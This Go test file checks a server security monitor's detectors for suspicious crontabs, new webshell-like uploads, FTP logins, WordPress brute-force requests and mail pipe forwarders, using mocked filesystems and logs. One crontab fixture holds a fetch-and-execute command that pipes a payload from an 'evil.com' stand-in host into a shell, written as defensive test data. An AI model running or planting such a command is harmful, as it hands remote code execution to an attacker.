package checks

import (
	"context"
	"os"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

// --- CheckCrontabs with suspicious crontab + baseline detection ------

func TestCheckCrontabsWithBaseline(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/var/spool/cron/alice"}, nil
		},
		readFile: func(name string) ([]byte, error) {
			return []byte("0 * * * * /usr/bin/backup.sh\n* * * * * curl http://evil.com/payload | sh\n"), nil
		},
	})

	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	// First call = baseline
	_ = CheckCrontabs(context.Background(), &config.Config{}, store)
	// Second call = detect suspicious entries
	findings := CheckCrontabs(context.Background(), &config.Config{}, store)
	_ = findings
}

// --- CheckFileIndex with previous + current diff ---------------------

func TestCheckFileIndexWithDiff(t *testing.T) {
	stateDir := t.TempDir()
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "uploads") {
				return []os.DirEntry{
					testDirEntry{name: "evil.php", isDir: false},
					testDirEntry{name: "new_webshell.php", isDir: false},
				}, nil
			}
			if strings.Contains(name, "alice") && !strings.Contains(name, "wp-content") {
				return []os.DirEntry{
					testDirEntry{name: "public_html", isDir: true},
				}, nil
			}
			if strings.Contains(name, "public_html") && !strings.Contains(name, "wp-content") {
				return []os.DirEntry{
					testDirEntry{name: "wp-content", isDir: true},
				}, nil
			}
			if strings.Contains(name, "wp-content") && !strings.Contains(name, "uploads") {
				return []os.DirEntry{
					testDirEntry{name: "uploads", isDir: true},
				}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "test", size: 100}, nil
		},
	})

	cfg := &config.Config{StatePath: stateDir}
	// First call = baseline
	_ = CheckFileIndex(context.Background(), cfg, nil)
	// Second call = detect new files
	findings := CheckFileIndex(context.Background(), cfg, nil)
	_ = findings
}

// --- CheckFTPLogins with log data ------------------------------------

func TestCheckFTPLoginsWithMultipleLogins(t *testing.T) {
	logData := ""
	for i := 0; i < 5; i++ {
		logData += "Apr 12 10:00:00 host pure-ftpd: (?@203.0.113.5) [INFO] alice is now logged in\n"
	}

	withMockOS(t, &mockOS{
		open: func(name string) (*os.File, error) {
			if strings.Contains(name, "messages") || strings.Contains(name, "syslog") {
				tmp := t.TempDir() + "/messages"
				_ = os.WriteFile(tmp, []byte(logData), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			if strings.Contains(name, "messages") || strings.Contains(name, "syslog") {
				return fakeFileInfo{name: "messages", size: int64(len(logData))}, nil
			}
			return nil, os.ErrNotExist
		},
	})

	_ = CheckFTPLogins(context.Background(), &config.Config{}, nil)
}

// --- getCageFSDisabledUsers with mock --------------------------------

func TestGetCageFSDisabledUsersEnabled(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: func(name string, args ...string) ([]byte, error) {
			if name == "cagefsctl" && len(args) > 0 && args[0] == "--list-disabled" {
				return []byte("alice\nbob\n"), nil
			}
			return nil, nil
		},
	})

	users := getCageFSDisabledUsers("enabled")
	if len(users) != 2 {
		t.Errorf("got %d users, want 2", len(users))
	}
}

// --- scanDomlogs via CheckWPBruteForce with many POST ----------------

func TestCheckWPBruteForceWithManyPOSTs(t *testing.T) {
	var lines []string
	for i := 0; i < 30; i++ {
		lines = append(lines, `203.0.113.5 - - [12/Apr/2026:10:00:00 +0000] "POST /wp-login.php HTTP/1.1" 200 1234`)
	}
	for i := 0; i < 20; i++ {
		lines = append(lines, `198.51.100.1 - - [12/Apr/2026:10:00:00 +0000] "POST /xmlrpc.php HTTP/1.1" 200 567`)
	}
	logContent := strings.Join(lines, "\n") + "\n"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "access") || strings.Contains(pattern, "ssl_log") {
				return []string{"/home/alice/access-logs/example.com-ssl_log"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			tmp := t.TempDir() + "/ssl_log"
			_ = os.WriteFile(tmp, []byte(logContent), 0644)
			return os.Open(tmp)
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "ssl_log", size: int64(len(logContent))}, nil
		},
		readFile: func(name string) ([]byte, error) {
			return []byte(logContent), nil
		},
	})

	findings := CheckWPBruteForce(context.Background(), &config.Config{}, nil)
	_ = findings
}

// --- auditValiasFile with pipe forwarder ----------------------------

func TestAuditValiasFilePipeForwarder(t *testing.T) {
	withMockOS(t, &mockOS{
		open: func(name string) (*os.File, error) {
			tmp := t.TempDir() + "/valias"
			content := "catch: |/usr/local/bin/process_email\ninfo: alice@example.com\nspam: :blackhole:\n"
			_ = os.WriteFile(tmp, []byte(content), 0644)
			return os.Open(tmp)
		},
	})

	localDomains := map[string]bool{"example.com": true}
	findings := auditValiasFile("/etc/valiases/example.com", "example.com", localDomains, &config.Config{})
	if len(findings) == 0 {
		t.Error("pipe forwarder should produce findings")
	}
}

// --- truncate edge cases ---------------------------------------------

func TestTruncateExact(t *testing.T) {
	if got := truncate("hello", 5); got != "hello" {
		t.Errorf("exact length should not truncate, got %q", got)
	}
}
